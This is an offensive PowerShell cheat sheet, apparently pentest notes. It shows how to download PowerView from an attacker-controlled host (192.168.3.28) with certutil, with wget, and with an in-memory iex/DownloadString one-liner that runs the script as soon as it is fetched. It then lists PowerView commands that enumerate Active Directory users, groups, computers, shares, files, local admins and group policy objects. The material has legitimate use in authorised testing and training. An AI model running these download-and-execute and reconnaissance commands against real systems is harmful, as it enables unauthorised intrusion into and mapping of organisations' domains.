# offensive powershell

Attacker's machine is 192.168.3.28, and a file called powerview.ps1 is being hosted on a web server

## download files from powershell

---

Download to file:

```powershell
certutil.exe -urlcache -f http://192.168.3.28/powerview.ps1 powerview.ps1
```

```powershell
wget http://192.168.3.28/powerview.ps1 -outfile powerview.ps1
```

Download to memory:

```powershell
iex (New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')
```

## enumerating users & groups

---

### users

View all users:

```powershell
Get-NetUser
```

View canonical names of users

```powershell
Get-NetUser | Select cn
```

View SAM account names of users

```powershell
Get-NetUser | Select -ExpandProperty SamAccountName
```

Check descriptions of users

```powershell
Find-UserField -SearchField Description
```

```powershell
Find-UserField -SearchField Description "admin"
```

### groups

View all groups. On the bottom of the output are user-created groups.

```powershell
Get-NetGroup
```

Get group of user

```powershell
Get-NetGroup -UserName "s.chisholm"
```

Get group, verbose

```powershell
Get-NetGroup -GroupName "IT Admins" -FullData
```

## enumerating domain computers and shares

---

List all domain-connected computers

```powershell
Get-NetComputer
```

List all domain-connected computers, verbose

```powershell
Get-NetComputer -FullData
```

List all computers based on OS. Keep in mind the asterisks (*) 

```powershell
Get-NetComputer -OperatingSystem "*Windows 10*"
```

View file shares

```powershell
Invoke-ShareFinder
```

View file shares except for default ones

```powershell
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC
```

View file shares, verbose

```powershell
Invoke-ShareFinder -Verbose
```

View interesting files

```powershell
Invoke-FileFinder
```

## enumerating local admins

---

```powershell
Invoke-EnumerateLocalAdmin
```

## enumerating group policy objects

---

```powershell
Get-NetGPO
```





































